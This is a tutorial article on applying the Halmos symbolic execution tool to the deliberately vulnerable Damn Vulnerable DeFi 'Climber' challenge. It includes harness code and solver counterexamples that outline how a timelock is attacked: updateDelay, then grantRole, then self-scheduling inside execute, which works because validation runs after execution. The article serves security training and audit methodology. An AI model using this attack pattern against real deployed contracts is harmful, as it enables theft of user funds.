# Halmos vs Climber
## Halmos version
halmos 0.2.4 was used in this article.
## Foreword
It is strongly assumed that the reader is familiar with the previous articles on solving 
1. [Unstoppable](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/unstoppable) 
2. [Truster](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/truster)
3. [Naive-receiver](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/naive-receiver)
4. [Side-entrance](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/side-entrance)
5. [The-rewarder](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/the-rewarder)
6. [Selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/selfie)
7. [Backdoor](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/backdoor)

since the main ideas here are largely repeated and we will not dwell on them again.
## Preparation
### Common prerequisites
1. Copy **Climber.t.sol** file to **ClimberHalmos.t.sol**.
2. Rename `test_climber()` to `check_climber()`, so Halmos will execute this test symbolically.
3. Avoid using `makeAddr()` cheatcode:
    ```solidity
    address deployer = address(0xcafe0000);
    address player = address(0xcafe0001);
    address recovery = address(0xcafe0002);
    address proposer = address(0xcafe0003);
    address sweeper = address(0xcafe0004);
    ```
4. Create **GlobalStorage** and save address-name pairs of contracts. Don't forget that in `vault`, the implementation is a separate contract:
    ```solidity
    function get_ERC1967Proxy_implementation(address proxy) public view 
                                            returns (address impl){
        // Check vault implementation immutability
        bytes32 slot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc; // implementation slot
        bytes32 result = _vm.load(address(proxy), slot);
        impl = address(uint160(uint256(result)));
        return impl;
    }
    ```
    ```solidity
    ...
    import "lib/GlobalStorage.sol";
    ...
    GlobalStorage glob;
    ...
    function setUp() public {
        ...
        glob = new GlobalStorage();
        ...
        glob.add_addr_name_pair(address(vault), "ERC1967Proxy");
        glob.add_addr_name_pair(glob.get_ERC1967Proxy_implementation(address(vault)), "ClimberVault");
        glob.add_addr_name_pair(address(timelock), "ClimberTimelock");
        glob.add_addr_name_pair(address(token), "DamnValuableToken");
        ...
    }
    ```
5. Print all contract addresses:
    ```solidity
    function check_climber() public checkSolvedByPlayer {
        SymbolicAttacker attacker = new SymbolicAttacker();
        console.log("GlobalStorage\t", address(glob));
        console.log("ClimberVaultProxy\t", address(vault));
        console.log("ClimberVaultImpl\t", glob.get_ERC1967Proxy_implementation(address(vault)));
        console.log("ClimberTimelock\t", address(timelock));
        console.log("token\t\t", address(token));
        console.log("GlobalStorage\t", address(attacker));
        ...
    }
    ```
    ```javascript
    $ halmos --solver-timeout-assertion 0 --function check_climber --loop 100
    ...
    [console.log] GlobalStorage      0x00000000000000000000000000000000000000000000000000000000aaaa0002
    [console.log] ClimberVaultProxy  0x00000000000000000000000000000000000000000000000000000000aaaa0004
    [console.log] ClimberVaultImpl   0x00000000000000000000000000000000000000000000000000000000aaaa0003
    [console.log] ClimberTimelock    0x00000000000000000000000000000000000000000000000000000000aaaa0005
    [console.log] DamnValuableToken  0x00000000000000000000000000000000000000000000000000000000aaaa0006
    [console.log] GlobalStorage      0x00000000000000000000000000000000000000000000000000000000aaaa0007
    ```
### _isSolved() implementation
The original checks look like:
```solidity
function _isSolved() private view {
    assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
    assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
}
```
We begin to come up with invariants that could help us achieve some unexpected behavior of target contracts:
1. The most obvious is checking whether we can somehow reduce the balance of the `vault`:
    ```solidity
    assert (token.balanceOf(address(vault)) >= VAULT_TOKEN_BALANCE);
    ```
2. A traditional `allowance` check is also here:
    ```solidity
    // Check allowance changes
    address symbolicSpender = svm.createAddress("symbolicSpender");
    assert (token.allowance(address(vault), symbolicSpender) == 0);
    ```
3. The `vault` contract has 2 interesting roles: `sweeper` and `owner`. Essentially, these are just variables of type `address` that can change:
    ```solidity
    address private _sweeper;

    modifier onlySweeper() {
        if (msg.sender != _sweeper) {
            revert CallerNotSweeper();
        }
        _;
    }
    ```
    ```solidity
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        OwnableStorage storage $ = _getOwnableStorage();
        return $._owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        if (owner() != _msgSender()) {
            revert OwnableUnauthorizedAccount(_msgSender());
        }
    }
    ```
    Let's see if we can change this somehow:
    ```solidity
    // Check vault roles immutability:
    assert(vault.getSweeper() == sweeper);
    assert(vault.owner() == address(timelock));
    ```
5. Since the `vault` from the setup is essentially a **UUPS** proxy contract, we can check whether the very **implementation** of this proxy cannot be manipulated in any way:
    ```solidity
    // Check vault implementation immutability
    assert(glob.get_ERC1967Proxy_implementation(address(vault)) == address(0xaaaa0003));
    ```
6. `timelock` also has a role system, but it is slightly different from `vault`. The main difference is that multiple addresses can have the same role:
   ```solidity
   import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";
   
   abstract contract ClimberTimelockBase is AccessControl {
   ...
   }
   ```
   ```solidity
   contract ClimberTimelock is ClimberTimelockBase {
   ...
       constructor(address admin, address proposer) {
        _setRoleAdmin(ADMIN_ROLE, ADMIN_ROLE);
        _setRoleAdmin(PROPOSER_ROLE, ADMIN_ROLE);

        _grantRole(ADMIN_ROLE, admin);
        _grantRole(ADMIN_ROLE, address(this)); // self administration
        _grantRole(PROPOSER_ROLE, proposer);

        delay = 1 hours;
        is_preload = true;
    }
   ...
   }
   ```
   So, let's check if we can give someone a new role in `timelock`:
    ```solidity
    // Check timelock roles immutability
    address symbolicProposer = svm.createAddress("symbolicProposer");
    vm.assume(symbolicProposer != proposer);
    assert(!timelock.hasRole(PROPOSER_ROLE, symbolicProposer));

    address symbolicAdmin = svm.createAddress("symbolicAdmin");
    vm.assume(symbolicAdmin != deployer);
    vm.assume(symbolicAdmin != address(timelock));
    assert(!timelock.hasRole(ADMIN_ROLE, symbolicAdmin));
    ```
## Improvement of coverage
### SymbolicAttacker callback handling
Up to this point, we have not considered scenarios where some target contract makes a symbolic `call` back to **SymbolicAttacker** by default. But on the example of the [side-entrance](https://github.com/igorganich/damn-vulnerable-defi-halmos/blob/master/test/side-entrance/README.md#callbacks), [selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/blob/master/test/selfie/README.md#onflashloan) and [backdoor](https://github.com/igorganich/damn-vulnerable-defi-halmos/blob/master/test/backdoor/README.md#delegatecall) challenges, we can say that this is a fairly common scenario when control is passed back to the contract controlled by the attacker.

Therefore, we will now add a special `fallback()` to **SymbolicAttacker**, which will be able to handle calls from other contracts:
```solidity
bool reent_guard = false;

fallback() external payable {
    vm.assume(reent_guard == false);
    reent_guard = true;
    console.log("inside fallback");
    bytes4 selector = svm.createBytes4("fallback_selector");
    vm.assume(selector == bytes4(msg.data));
    execute_tx("fallback_target");
    bytes memory retdata = svm.createBytes(1000, "fallback_retdata");// something should be returned
    reent_guard = false;
    assembly {
        return(add(retdata, 0x20), mload(retdata))
    }
}
```
Now let's add functionality to **GlobalStorage** to allow other contracts to call this `fallback()`:
```solidity
//SymbolicAttacker address
address attacker;
...
function set_attacker_addr(address addr) public {
    _vm.assume(attacker == address(0x0));
    attacker = addr;
}
...
function get_concrete_from_symbolic_optimized (address /*symbolic*/ addr) public 
                                        returns (address ret, bytes memory data) 
{
    bytes4 selector = _svm.createBytes4("selector");
    ...
     _vm.assume(attacker != address(0x0));
    if (addr == attacker)
    {
        data = _svm.createBytes(1000, "attacker_fallback_bytes");
        _vm.assume(selector == bytes4(data));
        _vm.assume(selector == bytes4(keccak256("attacker_fallback_selector()")));
    }
    _vm.assume(false); // Ignore cases when addr is not some concrete known address
}
```
So, `check_climber()`:
```solidity
function check_climber() public checkSolvedByPlayer {
    SymbolicAttacker attacker = new SymbolicAttacker();
    glob.set_attacker_addr(address(attacker));
    ...
}
```
### Handling proxy implementation
Let's take a closer look at something new. In this challenge, we see for the first time upgradable contracts implemented through **ERC1967Proxy**:
```solidity
// Deploy the vault behind a proxy,
// passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
vault = ClimberVault(
    address(
        new ERC1967Proxy(
            address(new ClimberVault()), // implementation
            abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
        )
    )
);
```
Thus, we have a contract that implements 2 interfaces at once: the **ERC1967Proxy** itself and its **implementation** contract interface. Let me remind you that we store only one interface name for each address in **GlobalStorage**, so currently we do not have a mechanism to symbolically execute functions of both interfaces for such proxy.

One elegant idea is to create a single **SuperInterface** that will be inherited from both interfaces. And we will pass the "**SuperInterface**" as a contract name to **GlobalStorage**:
```solidity
interface SuperInterface is ERC1967Proxy, ClimberVault {}
...
glob.add_addr_name_pair(address(vault), "SuperInterface");
```
However, there is a problem with this approach: upgradable contracts can change their **implementation**, so after a potential change of **implementation** contract, such a **SuperInterface** will no longer be relevant for this proxy.

So, we will have a somewhat more complicated, but more universal solution to this problem:
```solidity
function get_addr_data_selector(address /*symbolic*/ addr) private view
{
    ...
    for (uint256 i = 0; i < addresses_list_size; i++) {
            if (addresses[i] == addr) {
                string memory name = names_by_addr[addresses[i]];
                ret = addresses[i];
                // Proxy contracts could be accessed by 2 interfaces: ERC1967Proxy itself 
                // and its implementation contract
                if (keccak256(bytes(name)) == keccak256(bytes("ERC1967Proxy"))) {
                    bool is_implementation = _svm.createBool("is_implementation");
                    if (is_implementation) {
                        address imp = get_ERC1967Proxy_implementation(addresses[i]);
                        name = names_by_addr[imp];
                    }
                } 
                data = _svm.createCalldata(name);
                _vm.assume(selector == bytes4(data));
                return (ret, data, selector);
            }
    ...
}
```
Now the full functionality of the symbolic transaction brute forcing:
```solidity
/*
** if addr is a concrete value, this returns (addr, symbolic calldata for addr)
** if addr is symbolic, execution will split for each feasible case and it will return
**      (addr0, symbolic calldata for addr0), (addr1, symbolic calldata for addr1),
        ..., and so on (one pair per path)
** if addr is symbolic but has only 1 feasible value (e.g. with vm.assume(addr == ...)),
        then it should behave like the concrete case
*/
    function get_addr_data_selector(address /*symbolic*/ addr) private view
                                    returns (address ret, bytes memory data, bytes4 selector)
    {
        selector = _svm.createBytes4("selector");
        for (uint256 i = 0; i < addresses_list_size; i++) {
            if (addresses[i] == addr) {
                string memory name = names_by_addr[addresses[i]];
                ret = addresses[i];
                /*
                * Using the symbolic boolean variable "is_implementation" forces Halmos to separately consider
                * 2 cases: where the interface of the proxy itself or its implementation is used.
                */
                if (keccak256(bytes(name)) == keccak256(bytes("ERC1967Proxy"))) {
                    bool is_implementation = _svm.createBool("is_implementation");
                    if (is_implementation) {
                        address imp = get_ERC1967Proxy_implementation(addresses[i]);
                        name = names_by_addr[imp];
                    }
                } 
                data = _svm.createCalldata(name);
                _vm.assume(selector == bytes4(data));
                return (ret, data, selector);
            }
        }
        _vm.assume(attacker != address(0x0));
        if (addr == attacker)
        {
            data = _svm.createBytes(1000, "attacker_fallback_bytes");
            _vm.assume(bytes4(data) == bytes4(keccak256("attacker_fallback_selector()")));
            return (attacker, data, selector);
        }
        _vm.assume(false); // Ignore cases when addr is not some concrete known address
    }

    function get_concrete_from_symbolic (address /*symbolic*/ addr) public view 
                                        returns (address ret, bytes memory data) 
    {
        bytes4 selector;
        (ret, data, selector) = get_addr_data_selector(addr);
    }

    /*
    ** This function has the same purpose as get_concrete_from_symbolic,
    ** but applies optimizations and heuristics.
    */
    function get_concrete_from_symbolic_optimized (address /*symbolic*/ addr) public
                                        returns (address ret, bytes memory data) 
    {
        bytes4 selector;
        (ret, data, selector) = get_addr_data_selector(addr);

        for (uint256 s = 0; s < banned_selectors_size; s++) {
            _vm.assume(selector != banned_selectors[s]);
        }
        for (uint256 s = 0; s < used_selectors_size; s++) {
            _vm.assume(selector != used_selectors[s]);
        }
        used_selectors[used_selectors_size] = selector;
        used_selectors_size++;
    }
```
### Symbolic offsets
Let's take a look at these two functions from **ClimberTimelock**:
```solidity
function schedule(
    address[] calldata targets,
    uint256[] calldata values,
    bytes[] calldata dataElements,
    bytes32 salt
) external onlyRole(PROPOSER_ROLE) {
...
}

/**
* Anyone can execute what's been scheduled via `schedule`
*/
function execute(
    address[] calldata targets,
    uint256[] calldata values,
    bytes[] calldata dataElements,
    bytes32 salt)
    external payable
{
...
}
```
We immediately notice the use of `bytes[] calldata dataElements` as a passed argument. This is already a "classic" pattern that leads to a symbolic offset error. Therefore, as always, we create symbolic bytes ourselves internally, replacing the use of the original bytes with the ones we created.

But before we move directly to these replacements, it's worth talking about the local `operation` registration system. We have already encountered the functionality of scheduled `actions` in [selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/selfie#executeaction). There, each `action` was given a number in order. However, "Climber" uses a different system: we are expected to first pass arrays of `targets`, `values`, `bytes`, and `salt` to `schedule()`. All this stuff is concatenated and hashed:
```solidity
function getOperationId(
    address[] calldata targets,
    uint256[] calldata values,
    bytes[] calldata dataElements,
    bytes32 salt
) public pure returns (bytes32) {
    return keccak256(abi.encode(targets, values, dataElements, salt));
}
```
This hash is the `id` of this newly registered action:
```solidity
bytes32 id = getOperationId(targets, values, dataElements, salt);
...
operations[id].readyAtTimestamp = uint64(block.timestamp) + delay;
operations[id].known = true;
```
Then, when we want to execute this `action`, we have to pass exactly the same parameters to `execute()`, **byte by byte** (this is important), as in `schedule()`, because here the hash will be taken again, the `id` will be calculated, and based on this it will be clear whether this action was registered at all:
```solidity
function getOperationState(bytes32 id) public view returns (OperationState state) {
    Operation memory op = operations[id];

    if (op.known) {
        if (op.executed) {
            state = OperationState.Executed;
        } else if (block.timestamp < op.readyAtTimestamp) {
            state = OperationState.Scheduled;
        } else {
            state = OperationState.ReadyForExecution;
        }
    } else {
        state = OperationState.Unknown;
    }
}
```
```solidity
bytes32 id = getOperationId(targets, values, dataElements, salt);
...
if (getOperationState(id) != OperationState.ReadyForExecution) {
    revert NotReadyForExecution(id);
}
```
Even if we find a way to somehow register the `operation` (reminding: `attacker` is neither an `admin` nor a `proposer`) - we still need to fulfill two conditions to properly prepare the test for symbolic execution:
1. Bypass symbolic offset error in `execute()`. The "antidote" to it is to use the `CreateCalldata()` cheatcode to replace `dataElements[]`. 
2. `dataElements[]` bytes in the `schedule()` should be replaced not via `CreateCalldata()`, but via `CreateBytes()` cheatcode. The thing is, this seems more correct: we can really pass literally any bytes here. This is especially true in setups with upgradable proxy (nothing prevents us from creating an `operation` for proxy, which is not supported by the current **implementation** yet, but maybe someday it will be). And using `CreateCalldata()` imposes restrictions on what these bytes can be. Although I admit that this take can be debatable.

Such a mismatch in different cheatcodes in `schedule()` and `execute()` can badly affect the logic of finding the `id`. The fact is that the bytes generated by `CreateCalldata()` can be of completely different lengths, while `CreateBytes()` requires us to clearly specify the number of generated symbolic bytes ("extra" bytes will be replaced with `0s` as padding).

Now let's remember that we need to preserve the identity of the parameters of both functions to correctly schedule and execute the `operation`. Thus, we will not be able to simply prove that the `operation` we passed to `execute()` was scheduled. We are faced with an unusual problem that needs to be solved.

Here are some ideas on how we can solve this:
1. Somehow modify symbolic bytes from `CreateCalldata()` so that they are also of static size and output `0s` at the end as padding.
2. Handle separately situations with potential proxy **implementation** change.
3. Refactor the `operations` functionality itself to make it more "friendly" for symbolic analysis (Say "hello" to symbolic mapping keys from [backdoor](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/backdoor#ownerisnotabeneficiary-issue)).

All of them have the right to exist and can potentially be used to solve this problem. However, they require a lot of work. It is easier to slightly change the principle by which `id` is calculated: instead of concatenating the entire array of bytes, we can try to concatenate only the function selector from each byte array. This selector is always of static size, `4` bytes, which will allow us to check at `execute()` whether such a set of addresses and corresponding functions has been registered (without specific parameters for these functions). Of course, we take into account that any simplification of verification may lead to false counterexamples. But, in my opinion, this should be a profitable trade-off.

That's all, we've discussed the necessary topics. Let's implement it:
```solidity
abstract contract ClimberTimelockBase is AccessControl {
...
function getOperationId(
    address[] memory targets,
    uint256[] memory values,
    bytes4[] memory dataElementsSelectors, // Replaced bytes[] by bytes4[] here
    bytes32 salt
) public pure returns (bytes32) {
    return keccak256(abi.encode(targets, values, dataElementsSelectors, salt));
}
```
```solidity
contract ClimberTimelock is ClimberTimelockBase, FoundryCheats, HalmosCheats {
...
function schedule(
    address[] calldata targets,
    uint256[] calldata values,
    bytes[] calldata dataElements,
    bytes32 salt
) external onlyRole(PROPOSER_ROLE) {
    if (targets.length == MIN_TARGETS || targets.length >= MAX_TARGETS) {
        revert InvalidTargetsCount();
    }

    if (targets.length != values.length) {
        revert InvalidValuesCount();
    }

    if (targets.length != dataElements.length) {
        revert InvalidDataElementsCount();
    }

    address[] memory _targets = new address[](targets.length);
    uint256[] memory _values = new uint256[](values.length);
    bytes4[] memory _dataElementsSelectors = new bytes4[](dataElements.length);
    bytes32 _salt = _svm.createBytes32("schedule_salt");
    for (uint8 i = 0; i < targets.length; i++) {
        _targets[i] = _svm.createAddress("schedule_target");
        _values[i] = _svm.createUint256("schedule_value");
        _dataElementsSelectors[i] = _svm.createBytes4("schedule_selector");
    }

    bytes32 id = getOperationId(_targets, _values, _dataElementsSelectors, _salt);
    console.logBytes32(id);

    if (getOperationState(id) != OperationState.Unknown) {
        revert OperationAlreadyKnown(id);
    }

    operations[id].readyAtTimestamp = uint64(block.timestamp) + delay;
    operations[id].known = true;
}

/**
 * Anyone can execute what's been scheduled via `schedule`
 */
function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
    external
    payable
{
    if (targets.length <= MIN_TARGETS) {
        revert InvalidTargetsCount();
    }

    if (targets.length != values.length) {
        revert InvalidValuesCount();
    }

    if (targets.length != dataElements.length) {
        revert InvalidDataElementsCount();
    }

    address[] memory _targets = new address[](targets.length);
    uint256[] memory _values = new uint256[](values.length);
    bytes[] memory _dataElements = new bytes[](dataElements.length);
    bytes4[] memory _dataElementsSelectors = new bytes4[](dataElements.length);
    bytes32 _salt = _svm.createBytes32("execute_salt");
    for (uint8 i = 0; i < targets.length; i++) {
        _targets[i] = _svm.createAddress("execute_target");
        _values[i] = _svm.createUint256("execute_value");
        (_targets[i], _dataElements[i]) = glob.get_concrete_from_symbolic_optimized(_targets[i]);
        _dataElementsSelectors[i] = _svm.createBytes4("execute_selector");
        _vm.assume(_dataElementsSelectors[i] == bytes4( _dataElements[i]));
    }

    bytes32 id = getOperationId(_targets, _values, _dataElementsSelectors, _salt);

    for (uint8 i = 0; i < targets.length; ++i) {
        uint snap0 = _vm.snapshotState(); // Optimization by snapshot
        _targets[i].functionCallWithValue(_dataElements[i], _values[i]);
        uint snap1 = _vm.snapshotState();
        _vm.assume(snap0 != snap1);
    }

    if (getOperationState(id) != OperationState.ReadyForExecution) {
        revert NotReadyForExecution(id);
    }

    operations[id].executed = true;
}
```
## Expanding the number of symbolic transactions
### Places to expand
In the setup with one symbolic attacking transaction, Halmos did not find any counterexamples. Therefore, we do the usual expansion of the number of symbolic attacking transactions. As we know from [Selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/selfie#expand-onflashloan), `SymbolicAttacker::attack()` is not the only place where you can expand the number of symbolic transactions. In the current setup, there are at least 3 of them:
1. Actually, `SymbolicAttacker::attack()`:
    ```solidity
    function attack() public {
        vm.assume(msg.sender == address(0xcafe0001)); // Only player can execute it
        execute_tx("attack_target");
    }
    ```
2. `SymbolicAttacker::fallback()`:
    ```solidity
    fallback() external payable {
        ...
        execute_tx("fallback_target");
        ...
    }
    ```
3. Increase the number of transactions passed to `ClimberTimelock::execute()`:
    ```solidity
    function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
        external
        payable
    {
    ```
    We can do this by passing the `--default-array-lengths 3` parameter to Halmos (default value is `0, 1, 2`)

We have no choice but to try each of these methods one by one:

1. 
    ```solidity
    function attack() public {
        vm.assume(msg.sender == address(0xcafe0001)); // Only player can execute it
        execute_tx("attack_target1");
        execute_tx("attack_target2");
    }
    ```
    Adding one transaction to `attack()` did nothing: no counterexample found yet.
2. The same situation with the `fallback()` extension:
    ```solidity
    fallback() external payable {
        ...
        execute_tx("fallback_target1");
        execute_tx("fallback_target2");
        ...
    }
    ```
3. But increasing the functions number in `execute()` gave a very interesting result:
    ```javascript
    halmos --solver-timeout-assertion 0 --function check_climber --loop 100  --default-array-lengths 3 --solver-timeout-branching 0
    ...
    Counterexample:
        halmos_attack_target_address_2b26674_01 = 0x00000000000000000000000000000000aaaa0005
        halmos_execute_salt_bytes32_aeae062_44 = 0x0000000000000000000000000000000000000000000000000000000000000000
        halmos_execute_selector_bytes4_10ce5fe_134 = updateDelay
        halmos_execute_selector_bytes4_1645f73_89 = grantRole
        halmos_execute_selector_bytes4_8dd39aa_179 = schedule
        halmos_execute_target_address_85344a4_135 = 0x00000000000000000000000000000000aaaa0005
        halmos_execute_target_address_9aac6c2_90 = 0x00000000000000000000000000000000aaaa0005
        halmos_execute_target_address_df8939d_45 = 0x00000000000000000000000000000000aaaa0005
        halmos_execute_value_uint256_59c9434_46 = 0x0000000000000000000000000000000000000000000000000000000000000000
        halmos_execute_value_uint256_76d9b17_91 = 0x0000000000000000000000000000000000000000000000000000000000000000
        halmos_execute_value_uint256_be6fe48_136 = 0x0000000000000000000000000000000000000000000000000000000000000000
        halmos_schedule_salt_bytes32_2de977f_180 = 0x0000000000000000000000000000000000000000000000000000000000000000
        halmos_schedule_selector_bytes4_76b87f6_189 = schedule
        halmos_schedule_selector_bytes4_79d11c7_186 = updateDelay
        halmos_schedule_selector_bytes4_e3c43da_183 = grantRole
        halmos_schedule_target_address_01c0fa0_184 = 0x00000000000000000000000000000000aaaa0005
        halmos_schedule_target_address_7f47fc1_187 = 0x00000000000000000000000000000000aaaa0005
        halmos_schedule_target_address_be00243_181 = 0x00000000000000000000000000000000aaaa0005
        halmos_schedule_value_uint256_1a85646_185 = 0x0000000000000000000000000000000000000000000000000000000000000000
        halmos_schedule_value_uint256_9c79e34_182 = 0x0000000000000000000000000000000000000000000000000000000000000000
        halmos_schedule_value_uint256_a21a79e_188 = 0x0000000000000000000000000000000000000000000000000000000000000000
        halmos_selector_bytes4_4da5861_47 = grantRole
        halmos_selector_bytes4_9c02733_02 = execute
        halmos_selector_bytes4_9e9a490_92 = updateDelay
        halmos_selector_bytes4_e8b0dd5_137 = schedule
        halmos_symbolicProposer_address_c37dd86_191 = 0x00000000000000000000000000000000aaaa0005
        halmos_symbolicSpender_address_758d16e_190 = 0x0000000000000000000000000000000000000000
        p_account_address_ffb2231_67 = 0x00000000000000000000000000000000000000000000000000000000aaaa0005
        p_dataElements_length_8a0edaf_170 = 0x0000000000000000000000000000000000000000000000000000000000000003
        p_dataElements_length_e275aaa_13 = 0x0000000000000000000000000000000000000000000000000000000000000003
        p_newDelay_uint64_48ccc1d_133 = 0x0000000000000000000000000000000000000000000000000000000000000000
        p_role_bytes32_8629c87_66 = 0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1
        p_targets_length_09055e1_162 = 0x0000000000000000000000000000000000000000000000000000000000000003
        p_targets_length_baf4649_05 = 0x0000000000000000000000000000000000000000000000000000000000000003
        p_values_length_627b85a_166 = 0x0000000000000000000000000000000000000000000000000000000000000003
        p_values_length_fb84b24_09 = 0x0000000000000000000000000000000000000000000000000000000000000003
    ```
    And the other:
    ```javascript
    Counterexample:
    halmos_attack_target_address_2b26674_01 = 0x00000000000000000000000000000000aaaa0005
    halmos_attacker_fallback_bytes_bytes_303e2ea_138 = 0xfe96ffd0...00
    halmos_execute_salt_bytes32_aeae062_44 = 0x0000000000000000000000000000000000000000000000000000000000000001
    halmos_execute_selector_bytes4_10ce5fe_134 = updateDelay
    halmos_execute_selector_bytes4_1645f73_89 = grantRole
    halmos_execute_selector_bytes4_ead1bb5_139 = 0xfe96ffd0
    halmos_execute_target_address_85344a4_135 = 0x00000000000000000000000000000000aaaa0007
    halmos_execute_target_address_9aac6c2_90 = 0x00000000000000000000000000000000aaaa0005
    halmos_execute_target_address_df8939d_45 = 0x00000000000000000000000000000000aaaa0005
    halmos_execute_value_uint256_59c9434_46 = 0x0000000000000000000000000000000000000000000000000000000000000000
    halmos_execute_value_uint256_76d9b17_91 = 0x0000000000000000000000000000000000000000000000000000000000000000
    halmos_execute_value_uint256_be6fe48_136 = 0x0000000000000000000000000000000000000000000000000000000000000000
    halmos_fallback_selector_bytes4_1f7f8b9_140 = 0xfe96ffd0
    halmos_fallback_target_address_593d2c0_141 = 0x00000000000000000000000000000000aaaa0005
    halmos_schedule_salt_bytes32_33f5d35_184 = 0x0000000000000000000000000000000000000000000000000000000000000001
    halmos_schedule_selector_bytes4_47daa14_190 = updateDelay
    halmos_schedule_selector_bytes4_98bf8d3_193 = 0xfe96ffd0
    halmos_schedule_selector_bytes4_badb2f8_187 = grantRole
    halmos_schedule_target_address_4586a03_191 = 0x00000000000000000000000000000000aaaa0007
    halmos_schedule_target_address_70b108c_188 = 0x00000000000000000000000000000000aaaa0005
    halmos_schedule_target_address_bfbafb8_185 = 0x00000000000000000000000000000000aaaa0005
    halmos_schedule_value_uint256_8e27f62_189 = 0x0000000000000000000000000000000000000000000000000000000000000000
    halmos_schedule_value_uint256_e67d049_192 = 0x0000000000000000000000000000000000000000000000000000000000000000
    halmos_schedule_value_uint256_fb6813c_186 = 0x0000000000000000000000000000000000000000000000000000000000000000
    halmos_selector_bytes4_4da5861_47 = grantRole
    halmos_selector_bytes4_8a4ebe8_142 = schedule
    halmos_selector_bytes4_9c02733_02 = execute
    halmos_selector_bytes4_9e9a490_92 = updateDelay
    halmos_selector_bytes4_e8b0dd5_137 = 0x00000000
    halmos_symbolicProposer_address_d2fabe5_196 = 0x00000000000000000000000000000000aaaa0007
    halmos_symbolicSpender_address_2bbb991_195 = 0x0000000000000000000000000000000000000000
    p_account_address_ffb2231_67 = 0x00000000000000000000000000000000000000000000000000000000aaaa0007
    p_dataElements_length_e275aaa_13 = 0x0000000000000000000000000000000000000000000000000000000000000003
    p_dataElements_length_f569229_175 = 0x0000000000000000000000000000000000000000000000000000000000000003
    p_newDelay_uint64_48ccc1d_133 = 0x0000000000000000000000000000000000000000000000000000000000000000
    p_role_bytes32_8629c87_66 = 0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1
    p_targets_length_6074178_167 = 0x0000000000000000000000000000000000000000000000000000000000000003
    p_targets_length_baf4649_05 = 0x0000000000000000000000000000000000000000000000000000000000000003
    p_values_length_3bb651e_171 = 0x0000000000000000000000000000000000000000000000000000000000000003
    p_values_length_fb84b24_09 = 0x0000000000000000000000000000000000000000000000000000000000000003
    ```
    After 12 hours of execution, this test was still not finished, but these counterexamples appeared in the logs.

### Counterexamples analysis
Let's start with the first one. We are interested in these few lines:
```javascript
halmos_execute_selector_bytes4_10ce5fe_134 = updateDelay
halmos_execute_selector_bytes4_1645f73_89 = grantRole
halmos_execute_selector_bytes4_8dd39aa_179 = schedule
halmos_execute_target_address_85344a4_135 = 0x00000000000000000000000000000000aaaa0005
halmos_execute_target_address_9aac6c2_90 = 0x00000000000000000000000000000000aaaa0005
halmos_execute_target_address_df8939d_45 = 0x00000000000000000000000000000000aaaa0005
...
halmos_schedule_selector_bytes4_76b87f6_189 = schedule
halmos_schedule_selector_bytes4_79d11c7_186 = updateDelay
halmos_schedule_selector_bytes4_e3c43da_183 = grantRole
halmos_schedule_target_address_01c0fa0_184 = 0x00000000000000000000000000000000aaaa0005
halmos_schedule_target_address_7f47fc1_187 = 0x00000000000000000000000000000000aaaa0005
halmos_schedule_target_address_be00243_181 = 0x00000000000000000000000000000000aaaa0005
```
Halmos saw an interesting scenario: Anyone can invoke the following sequence of functions as an `operation`:
1. Disable `delay` by calling `ClimberTimelock::updateDelay()`
2. Grant `PROPOSER_ROLE` role for the `timelock` itself.
3. Call `schedule()` to register the transaction itself during its execution.

Thus, we broke the invariant about the immutability of `PROPOSER_ROLE` in `ClimberTimelock`.

What does this mean? If we have such a mechanism to manage the `ClimberTimelock` contract by `attacker`, then will we also find a full attack easily? Not so fast! Unfortunately, this is a fake counterexample for now. Remember, we simplified the `id` storage formula a bit? Let's try to apply this found counterexample in the original `id` calculation mechanism. Let's return the full set of bytes to the concatenation and try to find a transaction that registers itself according to the scenario described above:
```solidity
function getOperationId(
    address[] memory targets,
    uint256[] memory values,
    bytes[] memory dataElements,
    bytes32 salt
) public pure returns (bytes32) {
    return keccak256(abi.encode(targets, values, dataElements, salt));
}
```
And... We simply cannot cope with this task. To explain this, we'll need to use a bit of mathematical language. For simplicity, let's say `abi.encode(targets, values, dataElements, salt)` is `A`. So, `A` is the bytes array that encodes all the parameters passed to `execute()`. The last parameter in `dataElements[]` array, in order to schedule such `operation`, should be the same set of parameters, passed to `execute()` aka `A` again. In other words, `A` must be a part of `A` in this scenario. I don't think it's necessary to explain that this is impossible if `A` also has to contain encoded `updateDelay()` and `grantRole()`.

So, to summarize: We encountered somewhat contradictory results. On the one hand, our simplification of the `id` calculation led to a fake counterexample. But on the other hand, an experienced auditor would notice a violation of an important [principle](https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern) of writing secure contracts even from such a result: first we validate the passed parameters, then we execute them:
```solidity
bytes32 id = getOperationId(_targets, _values, _dataElementsSelectors, _salt);

for (uint8 i = 0; i < targets.length; ++i) {
    _targets[i].functionCallWithValue(_dataElements[i], _values[i]);
}

// Checking should be done BEFORE execution, not AFTER!!!
if (getOperationState(id) != OperationState.ReadyForExecution) {
    revert NotReadyForExecution(id);
}
```
